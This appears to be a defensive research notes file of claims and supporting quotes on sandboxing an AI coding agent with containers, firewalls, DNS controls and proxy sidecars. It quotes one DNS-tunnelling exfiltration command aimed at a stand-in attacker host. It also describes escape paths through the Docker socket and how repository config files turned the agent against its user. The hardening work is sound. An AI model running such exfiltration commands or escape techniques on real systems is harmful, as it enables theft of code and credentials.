claim: Anthropic's own comparison of sandboxing approaches ranks VM strongest, containers medium-effort, and states --dangerously-skip-permissions should always run inside a container, VM, or sandbox runtime.
quote: Always run `--dangerously-skip-permissions` sessions inside a container, a VM, or the sandbox runtime, so that file tools, MCP servers, and hooks are also inside the boundary.

claim: The reference devcontainer is an example not a maintained image; it warns it cannot prevent exfiltration of anything in the container including ~/.claude credentials, and the CLI rejects --dangerously-skip-permissions when launched as root.
quote: When executed with `--dangerously-skip-permissions`, dev containers do not prevent a malicious project from exfiltrating anything accessible inside the container, including the Claude Code credentials stored in `~/.claude`.

claim: The reference firewall script builds an ipset from GitHub's api.github.com/meta web+api+git CIDR blocks plus a handful of domains, sets INPUT/OUTPUT/FORWARD policy DROP, and allows DNS/53 and SSH/22 unconditionally.
quote: iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT

claim: The reference firewall allows outbound UDP/53 to any resolver, so DNS tunnelling bypasses the IP allowlist entirely; the issue was closed as not planned.
quote: These rules permit DNS queries to arbitrary servers, not just Docker's internal resolver. ... dig @attacker-dns-server.com $(echo "stolen-code" | base64).attacker.com

claim: Sandcat wires a transparent mitmproxy via a WireGuard sidecar and shares its network namespace with the agent container, so the agent itself holds no NET_ADMIN and cannot alter the firewall; secrets are placeholder-substituted at the proxy.
quote: Agent container shares wg-client's network namespace, inheriting the tunnel without `NET_ADMIN` privileges

claim: agentcage runs the agent on a Podman --internal network with no gateway, plus dnsmasq and mitmproxy sidecars, and is fail-closed by default.
quote: The agent runs on a Podman `--internal` network with no internet gateway, meaning all outbound traffic must pass through an inspecting proxy—there's no direct path to the internet.

claim: Rootless Docker runs daemon and containers inside a user namespace, needs 65536 subuid/subgid, does not support AppArmor, supports cgroups only on cgroup v2 + systemd, and needs CAP_NET_BIND_SERVICE or a sysctl to publish ports below 1024.
quote: AppArmor, Checkpoint, Overlay network, and exposing SCTP ports are not supported. ... Cgroup is supported only when running with cgroup v2 and systemd.

claim: Rootless mode trades daemon-root risk for a larger unprivileged-user-namespace kernel attack surface; Qualys disclosed three bypasses of Ubuntu's unprivileged-namespace restrictions in 2025.
quote: Qualys disclosed three methods to bypass Ubuntu's restrictions on unprivileged namespaces

claim: A 2026 comparative study of AI code sandbox engines finds runc/Docker has the largest attack surface, Firecracker the lowest CVE velocity, and rootless container runtimes still carry privilege-escalation risk.
quote: no single solution optimizes all security dimensions

claim: Docker's default seccomp profile blocks roughly 44 of 300+ syscalls including mount, unshare, keyctl, bpf, ptrace and the kernel-module calls.
quote: unshare: Deny cloning new namespaces for processes. Also gated by `CAP_SYS_ADMIN`. ... keyctl: Prevent containers from using the kernel keyring, which is not namespaced.

claim: In a default Docker container unshare fails with Operation not permitted because of the seccomp filter; CVE-2022-0185 needed that syscall.
quote: CVE-2022-0185 uses the unshare syscall to exploit a vulnerability, which is blocked by Docker's seccomp filter.

claim: Podman has no long-running privileged daemon; rootless Podman maps container UID 0 to the invoking user's host UID, so an escape yields that user's privileges rather than root.
quote: Podman runs containers as independent processes ... the root user inside the container (UID 0) maps to your regular user account on the host

claim: Podman labels container processes container_t by default and rootless containers get the same SELinux confinement as rootful ones, a layer rootless Docker lacks.
quote: Podman assigns the container_t SELinux type to container processes by default ... rootless containers get the same SELinux confinement as root containers.

claim: The reference devcontainer adds NET_ADMIN and NET_RAW via runArgs, bind-mounts only the workspace as /workspace, keeps ~/.claude and shell history in per-devcontainer named volumes, runs as remoteUser node, and applies the firewall in postStartCommand.
quote: "runArgs": ["--cap-add=NET_ADMIN", "--cap-add=NET_RAW"] ... "workspaceMount": "source=${localWorkspaceFolder},target=/workspace,type=bind,consistency=delegated"

claim: The reference Dockerfile is node:20, installs iptables/ipset/gh/jq, copies init-firewall.sh as root-owned and grants the node user a single NOPASSWD sudo rule for it.
quote: echo "node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh" > /etc/sudoers.d/node-firewall

claim: Running iptables inside a rootless Podman container needs both NET_ADMIN and NET_RAW, and the xt_/iptable_ kernel modules must be loaded on the host beforehand because module loading requires real root.
quote: with Podman you must load the WireGuard kernel module outside of Podman ... NET_RAW is needed to run `iptables` in a rootless container

claim: In an unprivileged Podman context an iptables/modprobe call fails with Operation not permitted when the needed netfilter module is not already loaded on the host.
quote: modprobe: ERROR: could not insert 'ip_tables': Operation not permitted

claim: Under rootless Docker, bind-mounted host files owned by the invoking user appear as root-owned inside the container, so a non-root container user cannot write the mounted repo.
quote: Mounting a volume with rootless with always assign ownership to root

claim: Podman's --userns=keep-id maps the host UID/GID straight through into the container, eliminating bind-mount permission mismatches in rootless mode.
quote: The `--userns=keep-id` option maps your host UID and GID directly into the container, eliminating the file permission mismatches that commonly occur with rootless containers and bind mounts.

claim: Driving VS Code Dev Containers off rootless Podman requires pointing the extension at the podman binary and adding --userns=keep-id plus containerUser/updateRemoteUserUID to devcontainer.json.
quote: "runArgs": ["--userns=keep-id:uid=1000,gid=1000"], "containerUser": "vscode", "updateRemoteUserUID": true

claim: Claude Code's documented egress requirements are api.anthropic.com, claude.ai, claude.com, platform.claude.com, mcp-proxy.anthropic.com, downloads.claude.ai, storage.googleapis.com, bridge.claudeusercontent.com, raw.githubusercontent.com, code.claude.com, two Datadog intake hosts, formulae.brew.sh, plus registry.npmjs.org for npm installs; it honours HTTPS_PROXY and NODE_EXTRA_CA_CERTS but not SOCKS.
quote: Claude Code requires access to the following URLs. Allowlist these in your proxy configuration and firewall rules, especially in containerized or restricted network environments.

claim: Compose's internal: true creates an externally isolated network with no external connectivity.
quote: By default, Compose provides external connectivity to networks. `internal`, when set to `true`, lets you create an externally isolated network.

claim: Docker's embedded resolver at 127.0.0.11 forwards any name it cannot answer locally to the host's upstream resolvers, so DNS still leaves the box even from an isolated network unless you override the resolver.
quote: If the name is not found within the local Docker network mapping, the embedded server forwards the DNS query to the host's configured upstream DNS servers

claim: podman network create --internal restricts external access on the network and disables the DNS name plugin for it.
quote: Restrict external access of this network. When using this option, the dnsname plugin will be automatically disabled.

claim: agent-sandbox pairs a mitmproxy sidecar with in-container iptables so only the proxy is reachable, mounts secrets into the proxy only, and warns that an IDE's devcontainer management channel is a control plane outside the firewall.
quote: Secret injection conducted in the proxy, so the agent container never sees secrets such as API keys.

claim: Mounting the Docker socket into a container is equivalent to granting host root, because the container can start a --privileged container.
quote: the docker socket allows for spawning containers and is an easy way to take full control of the host, for example by running another container with the --privileged flag

claim: CVE-2026-6406 let the Docker CLI --use-api-socket flag smuggle the Docker socket past Docker Desktop's Enhanced Container Isolation because the policy check inspected only HostConfig.Binds, not HostConfig.Mounts.
quote: the Docker CLI --use-api-socket flag mounts the Docker socket through the HostConfig.Mounts field instead of HostConfig.Binds, and the ECI enforcement logic in the Docker Desktop API proxy only inspects Binds

claim: VS Code Dev Containers copies the host .gitconfig into the container, reuses the host credential helper, and forwards the host SSH agent automatically.
quote: Credentials you've entered locally will be reused in the container and vice versa.

claim: Three disclosed Claude Code flaws (including CVE-2025-59536 and CVE-2026-21852) achieved command execution or API-key exfiltration purely from repository-local config files such as .claude/settings.json and .mcp.json.
quote: configuration files effectively become part of the execution layer

claim: Practitioner discussion on containing Claude Code centres on the official devcontainer, ad-hoc firejail scripts, and Docker's microVM sandboxes product.
quote: it's all just Docker containers under the hood

claim: The Dev Containers specification defines devcontainer.json as a portable description of a development environment.
quote: A development container allows you to use a container as a full-featured development environment.

claim: The devcontainer CLI is the editor-independent reference implementation of the spec, so devcontainer.json can be driven from a plain terminal.
quote: A reference implementation of the Development Containers Specification

claim: Docker Desktop's sandboxes feature provisions a microVM with its own Docker daemon and workspace sync as a stronger-than-container option.
quote: Docker Sandboxes provide isolated environments for running AI agents

claim: agentcage is MIT-licensed and ships a pluggable inspector chain over every request, WebSocket frame and DNS query, with allowlist/blocklist dnsmasq modes resolving denied domains to placeholder IPs.
quote: dnsmasq sidecar operates with allowlist and blocklist modes, resolving permitted domains while non-permitted domains resolve to placeholder IPs
